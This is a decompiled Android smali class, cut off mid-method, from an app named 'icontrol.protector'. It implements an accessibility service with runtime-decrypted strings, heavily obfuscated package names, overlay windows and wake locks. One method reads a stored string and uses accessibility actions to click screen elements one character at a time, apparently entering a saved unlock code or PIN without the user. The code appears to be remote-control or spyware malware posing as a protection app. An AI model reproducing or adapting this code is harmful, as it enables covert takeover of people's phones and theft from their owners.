.class public Lcom/icontrol/protector/AccessServices;
.super Landroid/accessibilityservice/AccessibilityService;
.source "SourceFile"


# static fields
.field public static A:F

.field public static B:I

.field public static C:I

.field public static D:F

.field public static E:Landroid/view/accessibility/AccessibilityNodeInfo;

.field public static F:Landroid/view/WindowManager;

.field public static G:Landroid/widget/FrameLayout;

.field public static H:Landroid/view/WindowManager$LayoutParams;

.field public static I:Landroid/view/WindowManager$LayoutParams;

.field public static J:Landroid/widget/LinearLayout;

.field public static K:Landroid/widget/TextView;

.field public static L:Landroid/widget/ProgressBar;

.field public static M:Landroid/widget/TextView;

.field public static N:Lcom/icontrol/protector/AccessServices;

.field public static O:Ljava/lang/String;

.field public static P:Ljava/lang/String;

.field public static Q:Ljava/lang/String;

.field public static R:Ljava/lang/String;

.field public static S:Ljava/lang/String;

.field public static T:Z

.field public static U:Z

.field public static V:Z

.field public static W:Ljava/lang/String;

.field public static X:Ljava/lang/String;

.field static Y:Ljava/util/HashMap;

.field private static Z:I

.field public static o:Z

.field public static p:Z

.field public static q:Landroid/view/WindowManager;

.field public static r:Landroid/view/WindowManager$LayoutParams;

.field public static s:Landroid/view/View;

.field public static t:Landroid/view/WindowManager;

.field public static u:Ljava/util/List;

.field public static v:Ljava/util/LinkedHashMap;

.field public static w:Landroid/view/WindowManager$LayoutParams;

.field public static x:Ljava/lang/Boolean;

.field public static y:I

.field public static z:I


# instance fields
.field public b:Landroid/webkit/WebView;

.field public c:I

.field public d:I

.field e:I

.field private f:Z

.field private g:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h70;

.field h:Landroid/os/Handler;

.field public i:Landroid/os/Handler;

.field private final j:Ljava/util/concurrent/ThreadPoolExecutor;

.field private k:Ljava/lang/Thread;

.field private l:Landroid/os/PowerManager$WakeLock;

.field private m:Ljava/lang/Thread;

.field private n:Landroid/net/wifi/WifiManager$WifiLock;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/icontrol/protector/AccessServices;->u:Ljava/util/List;

    new-instance v0, Ljava/util/LinkedHashMap;

    invoke-direct {v0}, Ljava/util/LinkedHashMap;-><init>()V

    sput-object v0, Lcom/icontrol/protector/AccessServices;->v:Ljava/util/LinkedHashMap;

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object v0, Lcom/icontrol/protector/AccessServices;->x:Ljava/lang/Boolean;

    const/4 v0, 0x0

    sput v0, Lcom/icontrol/protector/AccessServices;->y:I

    sput v0, Lcom/icontrol/protector/AccessServices;->z:I

    const/4 v1, 0x0

    sput v1, Lcom/icontrol/protector/AccessServices;->A:F

    sput v0, Lcom/icontrol/protector/AccessServices;->B:I

    sput v0, Lcom/icontrol/protector/AccessServices;->C:I

    sput v1, Lcom/icontrol/protector/AccessServices;->D:F

    const/4 v0, 0x0

    sput-object v0, Lcom/icontrol/protector/AccessServices;->E:Landroid/view/accessibility/AccessibilityNodeInfo;

    const-string v0, ""

    sput-object v0, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    const-string v1, " "

    sput-object v1, Lcom/icontrol/protector/AccessServices;->P:Ljava/lang/String;

    const/4 v1, 0x3

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lcom/icontrol/protector/AccessServices;->Q:Ljava/lang/String;

    sput-object v0, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    sput-object v0, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    sput-object v0, Lcom/icontrol/protector/AccessServices;->W:Ljava/lang/String;

    sput-object v0, Lcom/icontrol/protector/AccessServices;->X:Ljava/lang/String;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lcom/icontrol/protector/AccessServices;->Y:Ljava/util/HashMap;

    const/4 v0, 0x1

    sput v0, Lcom/icontrol/protector/AccessServices;->Z:I

    return-void

    nop

    :array_0
    .array-data 1
        -0x48t
        0x29t
        -0x73t
    .end array-data

    :array_1
    .array-data 1
        -0x35t
        0x40t
        -0x20t
        0x6ct
        0x7dt
        -0x51t
        0x65t
        -0x6bt
    .end array-data
.end method

.method public constructor <init>()V
    .locals 10

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    const/4 v0, 0x0

    iput v0, p0, Lcom/icontrol/protector/AccessServices;->e:I

    iput-boolean v0, p0, Lcom/icontrol/protector/AccessServices;->f:Z

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->g:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h70;

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    move-result-object v1

    new-instance v2, Lcom/icontrol/protector/AccessServices$f;

    invoke-direct {v2, p0}, Lcom/icontrol/protector/AccessServices$f;-><init>(Lcom/icontrol/protector/AccessServices;)V

    invoke-direct {v0, v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;Landroid/os/Handler$Callback;)V

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->h:Landroid/os/Handler;

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    new-instance v2, Lcom/icontrol/protector/AccessServices$j;

    invoke-direct {v2, p0}, Lcom/icontrol/protector/AccessServices$j;-><init>(Lcom/icontrol/protector/AccessServices;)V

    invoke-direct {v0, v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;Landroid/os/Handler$Callback;)V

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->i:Landroid/os/Handler;

    new-instance v0, Ljava/util/concurrent/ThreadPoolExecutor;

    const/16 v4, 0xa

    const/16 v5, 0xa

    const-wide/16 v6, 0xf

    sget-object v8, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    new-instance v9, Ljava/util/concurrent/LinkedBlockingQueue;

    invoke-direct {v9}, Ljava/util/concurrent/LinkedBlockingQueue;-><init>()V

    move-object v3, v0

    invoke-direct/range {v3 .. v9}, Ljava/util/concurrent/ThreadPoolExecutor;-><init>(IIJLjava/util/concurrent/TimeUnit;Ljava/util/concurrent/BlockingQueue;)V

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->j:Ljava/util/concurrent/ThreadPoolExecutor;

    return-void
.end method

.method private B()V
    .locals 9

    .line 1
    sget-object v0, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const/4 v1, 0x3

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const-string v4, ""

    invoke-static {v0, v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    sget-object v0, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v5, v3, [B

    fill-array-data v5, :array_3

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_0

    sget-object v0, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v2, v3, [B

    fill-array-data v2, :array_5

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    :cond_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    sget-object v1, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    const/4 v2, 0x0

    move v4, v2

    :goto_0
    const/16 v5, 0x10

    if-ge v4, v1, :cond_2

    :try_start_0
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/zf0;->c()Z

    move-result v6

    if-eqz v6, :cond_1

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v7, 0x22

    new-array v7, v7, [B

    fill-array-data v7, :array_6

    new-array v8, v3, [B

    fill-array-data v8, :array_7

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    add-int/lit8 v8, v4, 0x1

    invoke-virtual {v7, v4, v8}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    invoke-interface {v6, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    :goto_1
    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v6, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_2

    :cond_1
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v7, 0x1b

    new-array v7, v7, [B

    fill-array-data v7, :array_8

    new-array v8, v3, [B

    fill-array-data v8, :array_9

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    add-int/lit8 v8, v4, 0x1

    invoke-virtual {v7, v4, v8}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    invoke-interface {v6, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    :goto_2
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :cond_2
    const/16 v1, 0x26

    :try_start_1
    new-array v1, v1, [B

    fill-array-data v1, :array_a

    new-array v4, v3, [B

    fill-array-data v4, :array_b

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_3

    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    :goto_3
    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_4

    :cond_3
    const/16 v1, 0x21

    new-array v1, v1, [B

    fill-array-data v1, :array_c

    new-array v3, v3, [B

    fill-array-data v3, :array_d

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    goto :goto_3

    :goto_4
    invoke-virtual {v0, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void

    nop

    :array_0
    .array-data 1
        0x1t
        -0x79t
        -0x7dt
    .end array-data

    :array_1
    .array-data 1
        0x70t
        -0x10t
        -0x1at
        -0x54t
        -0x6t
        0x64t
        -0x71t
        -0x6ft
    .end array-data

    :array_2
    .array-data 1
        -0x72t
        -0x27t
        -0x25t
    .end array-data

    :array_3
    .array-data 1
        -0x1t
        -0x52t
        -0x42t
        -0x30t
        0x6at
        -0x14t
        0x19t
        0x59t
    .end array-data

    :array_4
    .array-data 1
        -0x28t
        0x37t
        0x26t
    .end array-data

    :array_5
    .array-data 1
        -0x57t
        0x40t
        0x43t
        -0x24t
        0x9t
        0x39t
        -0x14t
        -0x1ct
    .end array-data

    :array_6
    .array-data 1
        -0x1bt
        0x7bt
        -0x52t
        -0x70t
        0x8t
        -0x2ft
        -0x42t
        -0x41t
        -0x17t
        0x7dt
        -0x59t
        -0x70t
        0x1at
        -0x3at
        -0x57t
        -0x47t
        -0x1dt
        0x79t
        -0x4at
        -0x29t
        0x53t
        -0x2at
        -0x42t
        -0x1et
        -0x30t
        0x7dt
        -0x4bt
        -0x2ft
        0x39t
        -0x2at
        -0x4ct
        -0x5at
        -0x1dt
        0x6dt
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x7at
        0x14t
        -0x3dt
        -0x42t
        0x69t
        -0x41t
        -0x26t
        -0x33t
    .end array-data

    :array_8
    .array-data 1
        -0x7ft
        -0x19t
        0x6ct
        0x5ft
        0x23t
        0x56t
        -0x13t
        -0x73t
        -0x73t
        -0x1ft
        0x65t
        0x5ft
        0x31t
        0x41t
        -0x6t
        -0x75t
        -0x79t
        -0x1bt
        0x74t
        0x18t
        0x78t
        0x51t
        -0x13t
        -0x30t
        -0x77t
        -0x13t
        0x78t
    .end array-data

    :array_9
    .array-data 1
        -0x1et
        -0x78t
        0x1t
        0x71t
        0x42t
        0x38t
        -0x77t
        -0x1t
    .end array-data

    :array_a
    .array-data 1
        -0x3ft
        0x29t
        -0x7et
        -0x7ft
        0x49t
        -0x71t
        -0x17t
        -0x63t
        -0x33t
        0x2ft
        -0x75t
        -0x7ft
        0x5bt
        -0x68t
        -0x2t
        -0x65t
        -0x39t
        0x2bt
        -0x66t
        -0x3at
        0x12t
        -0x78t
        -0x17t
        -0x40t
        -0x37t
        0x23t
        -0x6at
        -0x10t
        0x4dt
        -0x71t
        -0x7t
        -0x76t
        -0x30t
        0x19t
        -0x65t
        -0x36t
        0x50t
        -0x6bt
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x5et
        0x46t
        -0x11t
        -0x51t
        0x28t
        -0x1ft
        -0x73t
        -0x11t
    .end array-data

    :array_c
    .array-data 1
        -0x30t
        0xdt
        -0x10t
        0x8t
        -0x30t
        -0x65t
        0x28t
        0x3at
        -0x24t
        0xbt
        -0x7t
        0x8t
        -0x3et
        -0x74t
        0x3ft
        0x3ct
        -0x2at
        0xft
        -0x18t
        0x4ft
        -0x75t
        -0x64t
        0x28t
        0x67t
        -0x28t
        0x7t
        -0x1ct
        0x79t
        -0x2ct
        -0x65t
        0x38t
        0x2dt
        -0x3ft
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x4dt
        0x62t
        -0x63t
        0x26t
        -0x4ft
        -0xbt
        0x4ct
        0x48t
    .end array-data
.end method

.method private C()V
    .locals 2

    .line 1
    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h70;

    invoke-direct {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h70;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->g:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h70;

    new-instance v1, Lcom/icontrol/protector/AccessServices$d;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/AccessServices$d;-><init>(Lcom/icontrol/protector/AccessServices;)V

    invoke-virtual {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h70;->b(Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/i70;)V

    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->g:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h70;

    invoke-virtual {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h70;->c()V

    return-void
.end method

.method private D()V
    .locals 3

    .line 1
    sget-object v0, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    const/16 v1, 0x10

    const-string v2, ""

    if-le v0, v1, :cond_0

    sput-object v2, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    return-void

    :cond_0
    sget-object v0, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-eqz v0, :cond_1

    sget-object v0, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    sget-object v1, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    if-ne v0, v1, :cond_3

    :cond_1
    sget-object v0, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    sput-object v0, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-nez v0, :cond_2

    return-void

    :cond_2
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/icontrol/protector/AccessServices$e;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/AccessServices$e;-><init>(Lcom/icontrol/protector/AccessServices;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_3
    sput-object v2, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    return-void
.end method

.method public static synthetic a(Lcom/icontrol/protector/AccessServices;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lcom/icontrol/protector/AccessServices;->r()V

    return-void
.end method

.method public static synthetic b(Lcom/icontrol/protector/AccessServices;Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/icontrol/protector/AccessServices;->s(Landroid/content/Context;)V

    return-void
.end method

.method public static e(Landroid/content/Context;Ljava/lang/String;)V
    .locals 7

    .line 1
    :try_start_0
    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;

    const/16 v1, 0x11

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, p0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    sget-object v2, Lcom/icontrol/protector/My_Configs;->_Notfy_TITL_:Ljava/lang/String;

    invoke-virtual {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;->h(Ljava/lang/CharSequence;)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;

    move-result-object v0

    invoke-virtual {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;->g(Ljava/lang/CharSequence;)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;

    move-result-object p1

    const/4 v0, 0x1

    invoke-virtual {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;->s(I)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;

    move-result-object p1

    invoke-virtual {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;->m(I)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;

    move-result-object p1

    sget v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a30;->g:I

    invoke-virtual {p1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;->p(I)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;

    move-result-object p1

    invoke-virtual {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;->d(Z)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mw$c;

    move-result-object p1

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x1a

    if-lt v2, v4, :cond_0

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/x;->a()V

    new-array v4, v1, [B

    fill-array-data v4, :array_2

    new-array v5, v3, [B

    fill-array-data v5, :array_3

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xd

    new-array v5, v5, [B

    fill-array-data v5, :array_4

    new-array v6, v3, [B

    fill-array-data v6, :array_5

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x4

    invoke-static {v4, v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/w;->a(Ljava/lang/String;Ljava/lang/CharSequence;I)Landroid/app/NotificationChannel;

    move-result-object v4

    const-class v5, Landroid/app/NotificationManager;

    invoke-virtual {p0, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/app/NotificationManager;

    invoke-static {v5, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/z;->a(Landroid/app/NotificationManager;Landroid/app/NotificationChannel;)V

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v4, v3, [B

    fill-array-data v4, :array_7

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

